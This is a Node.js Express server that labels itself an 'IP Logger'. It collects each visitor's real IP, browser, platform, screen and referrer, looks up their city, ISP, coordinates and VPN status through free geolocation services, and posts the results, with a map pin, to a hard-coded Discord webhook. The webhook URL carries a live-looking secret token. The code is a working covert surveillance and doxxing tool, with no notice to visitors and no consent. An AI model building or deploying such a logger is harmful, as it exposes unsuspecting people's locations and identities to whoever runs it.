// server.js - FIXED with free geolocation (no API key needed)
const express = require('express');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const WEBHOOK = 'https://discord.com/api/webhooks/1509278082266173570/vHWTr8aEyCMmu11lTl9jqlrDhAhsus94SFWk-GMgd_0JfV8nf7-gfeA96XhgYAvOS18Z';

const visitorStore = new Map();

// Try multiple free geolocation services
async function getLocationData(ip) {
    // Remove IPv6 prefix if present
    const cleanIP = ip.replace('::ffff:', '');
    
    // Try ipwho.is first (no key required)
    try {
        const res = await fetch(`https://ipwho.is/${cleanIP}`, { timeout: 3000 });
        const data = await res.json();
        if (data.success) {
            return {
                city: data.city || 'Unknown',
                country: data.country || 'Unknown',
                region: data.region || 'Unknown',
                isp: data.connection?.isp || 'Unknown',
                org: data.connection?.org || 'Unknown',
                mobile: data.connection?.type === 'mobile',
                proxy: data.security?.proxy || false,
                vpn: data.security?.vpn || false,
                latitude: data.latitude,
                longitude: data.longitude
            };
        }
    } catch(e) {
        console.log('ipwho.is failed:', e.message);
    }

    // Fallback to ip-api.com (no key, but rate limited)
    try {
        const res = await fetch(`http://ip-api.com/json/${cleanIP}?fields=status,country,city,isp,org,as,mobile,proxy,lat,lon`, { timeout: 3000 });
        const data = await res.json();
        if (data.status === 'success') {
            return {
                city: data.city || 'Unknown',
                country: data.country || 'Unknown',
                region: data.regionName || 'Unknown',
                isp: data.isp || 'Unknown',
                org: data.org || 'Unknown',
                mobile: data.mobile || false,
                proxy: data.proxy || false,
                vpn: false,
                latitude: data.lat,
                longitude: data.lon
            };
        }
    } catch(e) {
        console.log('ip-api failed:', e.message);
    }

    // Fallback to geojs.io (no key)
    try {
        const res = await fetch(`https://get.geojs.io/v1/ip/geo/${cleanIP}.json`, { timeout: 3000 });
        const data = await res.json();
        return {
            city: data.city || 'Unknown',
            country: data.country || 'Unknown',
            region: data.region || 'Unknown',
            isp: data.organization_name || 'Unknown',
            org: data.organization || 'Unknown',
            mobile: false,
            proxy: false,
            vpn: false,
            latitude: data.latitude,
            longitude: data.longitude
        };
    } catch(e) {
        console.log('geojs failed:', e.message);
    }

    return { city: 'Unknown', country: 'Unknown', region: 'Unknown', isp: 'Unknown', mobile: false, proxy: false };
}

async function handleLog(req, res) {
    try {
        const { visitorId, browser, platform, screen, url, referrer } = req.body;
        
        // Get real IP
        const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                   req.headers['x-real-ip'] ||
                   req.socket.remoteAddress?.replace('::ffff:', '');
        
        console.log('📍 New request from IP:', ip);

        // Get location data
        const location = await getLocationData(ip);
        console.log('🌍 Location:', location);

        // Check recurring
        const isRecurring = visitorStore.has(visitorId);
        const visitCount = isRecurring ? visitorStore.get(visitorId) + 1 : 1;
        visitorStore.set(visitorId, visitCount);

        const embed = {
            title: isRecurring ? "🔄 RECURRING VISITOR" : "🆕 NEW VISITOR",
            color: isRecurring ? 0xff6600 : 0x00ff00,
            timestamp: new Date().toISOString(),
            fields: [
                { name: "Visit #", value: visitCount.toString(), inline: true },
                { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
                { name: "📍 Location", value: `${location.city}, ${location.country}`, inline: true },
                { name: "🏢 ISP / Org", value: `${location.isp}\n${location.org}`.substring(0, 500), inline: false },
                { name: "🗺️ Coords", value: location.latitude ? `${location.latitude}, ${location.longitude}` : 'N/A', inline: true },
                { name: "📱 Mobile", value: location.mobile ? 'Yes' : 'No', inline: true },
                { name: "🛡️ Proxy/VPN", value: location.proxy ? 'Yes' : 'No', inline: true },
                { name: "💻 Browser", value: browser?.substring(0, 400) || 'Unknown', inline: false },
                { name: "🖥️ Platform", value: platform || 'Unknown', inline: true },
                { name: "📺 Screen", value: screen || 'Unknown', inline: true },
                { name: "🔗 Page URL", value: url?.substring(0, 500) || 'Unknown', inline: false },
                { name: "📨 Referrer", value: referrer?.substring(0, 500) || 'Direct', inline: false }
            ],
            footer: {
                text: `Visitor ID: ${visitorId?.substring(0, 20)}...`
            }
        };

        // Add map thumbnail if coordinates available
        if (location.latitude && location.longitude) {
            embed.image = {
                url: `https://maps.geoapify.com/v1/staticmap?style=osm-bright&width=600&height=300&center=lonlat:${location.longitude},${location.latitude}&zoom=12&marker=lonlat:${location.longitude},${location.latitude};color:%23ff0000;size:large&apiKey=YOUR_GEOAPIFY_KEY`
            };
        }

        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });

        console.log('✅ Logged to Discord');
        res.json({ success: true, recurring: isRecurring, visitCount, location });

    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ error: error.message });
    }
}

// Accept POST to both / and /log
app.post('/', handleLog);
app.post('/log', handleLog);

// Health check
app.get('/', (req, res) => {
    res.json({ 
        status: 'IP Logger Running', 
        uptime: process.uptime(),
        endpoints: ['POST /', 'POST /log']
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));